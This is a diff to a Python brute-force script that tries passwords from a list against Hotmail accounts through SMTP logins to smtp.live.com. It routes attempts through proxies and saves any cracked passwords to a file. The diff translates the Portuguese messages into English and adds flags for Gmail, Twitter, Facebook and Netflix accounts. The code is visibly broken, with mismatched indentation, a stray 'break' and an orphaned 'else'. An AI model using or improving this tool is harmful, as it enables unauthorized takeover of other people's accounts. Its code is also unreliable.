@@ -47,15 +47,22 @@ _____________________                              _____________________
                                    \/ 
 {}
 -----------------------------------------------------------------------
-                                        
--t --hotmail                            CONTA hotmail @ hotmail.com                     
+-g --gmail                              ACCOUNT gmail @gmail.com
+-t --hotmail                            ACCOUNT hotmail @hotmail.com
+-T --twitter                            ACCOUNT  twitter @
+-f --facebook                           ACCOUNT  facebook @
+-n --netflix                            Account  Netflix @
 -l --list                               List    Password BrutoForce
 -p --password                           Single  Password
 -X --proxy                              Proxy list
                             
 							   """.format(G,R))
 
-use.add_option("-t","--hotmail",dest="hotmail",help="Escreva sua conta hotmail")
+use.add_option("-g","--gmail",dest="gmail",help="Write Your Account gmail")
+use.add_option("-t","--hotmail",dest="hotmail",help="Write Your Account hotmail")
+use.add_option("-T","--twitter",dest="twitter",help="Write Your Account twitter")
+use.add_option("-f","--facebook",dest="facebook",help="Write Your Account facebook")
+use.add_option("-n","--netflix",dest="netflix",help="Write Your Account Netflix")
 use.add_option("-l","--list",dest="list_password",help="Write Your list passowrd")
 use.add_option("-p","--password",dest="password",help="Write Your passowrd ")
 use.add_option("-X","--proxy",dest="proxy",help="Proxy list ")
@@ -88,11 +95,16 @@ def proxy():
         checkProxyIP = brows.open("https://api.ipify.org/?format=raw", timeout=10)
     except:
         return proxy()
+
+    if options.hotmail == None :
+                    print(use.usage)
+                    exit()       
+    elif options.hotmail != None or options.gmail == None:
         smtp_srverH= smtplib.SMTP('smtp.live.com', 587)
         smtp_srverH.ehlo()
         smtp_srverH.starttls()
         if options.password != None or options.list_password == None  :
-            print("%s<<<<<<+++++Comece a atacar e-mail+++++>>>>>%s"%(R,W))
+            print("%s<<<<<<+++++Start  Attacking Email+++++>>>>>%s"%(R,W))
             try :
                 smtp_srverH.login(options.hotmail,options.password)
                 print("Found Password :{} \t Found Hotmail:{}".format(options.password,options.hotmail))
@@ -109,6 +121,11 @@ def proxy():
                     Save = io.open("Hotmail.txt","a").write("Account Hotmail:"+options.hotmail+"\t\tPassword:"+password+"\n")
                 except smtplib.SMTPAuthenticationError:
                     print("Not Found Password : {} \t Email Hotmail:{}".format(password,options.hotmail))
-  
-   
-############################################################THE END####################################################################
+		break
+    
+                      
+
+else:
+    print(use.usage)
+    exit()  
+############################################################O FIM####################################################################
